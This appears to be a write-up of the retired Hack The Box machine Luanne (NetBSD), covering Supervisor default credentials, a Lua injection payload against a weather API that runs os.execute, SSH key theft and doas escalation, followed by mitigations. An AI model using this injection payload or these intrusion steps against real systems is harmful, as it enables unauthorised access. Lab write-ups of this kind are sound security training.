---
machine: Luanne
os: NetBSD
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [netbsd, supervisor, lua, doas, pgp]
---

# Luanne — Hack The Box (NetBSD)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Supervisor on 9001 uses default credentials and leaks the command line of an `httpd` running a Lua script. `/weather/forecast` is vulnerable to Lua injection and gives a shell as `_httpd`. A `.htpasswd` and the `~r.michaels` directory allow downloading his SSH key. `doas` allows root but asks for a password; a PGP backup contains it.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
22/tcp   ssh     OpenSSH 8.0 (NetBSD)
80/tcp   http    nginx 1.19.0
9001/tcp http    Supervisor (Medusa)
```

## Enumeration

- Supervisor accepts `user:123` and lists processes.
- The `httpd` line reveals `-L weather /usr/local/webapi/weather.lua`.
- The site uses Basic Auth and `robots.txt` points to `/weather`.
- `/weather/forecast?city=` reflects input into JSON generated with `load()`.

## Foothold

The city is inserted into a Lua string that is later evaluated. The string is closed and `os.execute` runs.

```bash
curl -s -G 'http://<IP>/weather/forecast' --data-urlencode "city=') os.execute('id') --"
```

A reverse shell yields `_httpd`. The web `.htpasswd` is cracked and authenticates to `http://127.0.0.1:3001/~r.michaels/`, where `id_rsa` lives.

```bash
curl -s -u webapi_user:<PASSWORD> http://127.0.0.1:3001/~r.michaels/
```

## Lateral movement

The `id_rsa` key provides SSH as `r.michaels`. `doas.conf` allows `permit r.michaels as root`, but requires a password.

```bash
chmod 600 id_rsa
ssh -i id_rsa r.michaels@<IP>
doas -l
```

## Privilege escalation

The home holds a `.tar.gz.gpg` backup and the key to decrypt it. Inside is a different `.htpasswd` and `r.michaels`' password; it is used with `doas`.

```bash
gpg -d backup.tar.gz.gpg > backup.tar.gz
tar zxvf backup.tar.gz
doas sh
```

## Evidence

- Trimmed output from key commands; no flags, credentials or tokens.
- Real values, when present, live in `private/` and are not published.

## Lessons learned

- Supervisor with default credentials leaks processes and paths.
- `load()` on user input is `eval` and enables Lua injection.
- A reused `.htpasswd` may (badly) protect an SSH key.
- A backup encrypted with a key on the same host protects nothing.

## Mitigations and detection

- Change Supervisor credentials and bind it to localhost.
- Do not use `load()` with external input; serialise JSON safely.
- Rotate passwords and do not reuse hashes across services.
- Keep the PGP key off-host and audit `doas`.

## References

- [0xdf — Luanne](https://0xdf.gitlab.io/2021/03/27/htb-luanne.html)
- [Video search (CSV)](https://www.youtube.com/results?search_query=ippsec+luanne)
- [Writeup search (CSV)](https://medium.com/search?q=hackthebox+luanne+writeup)
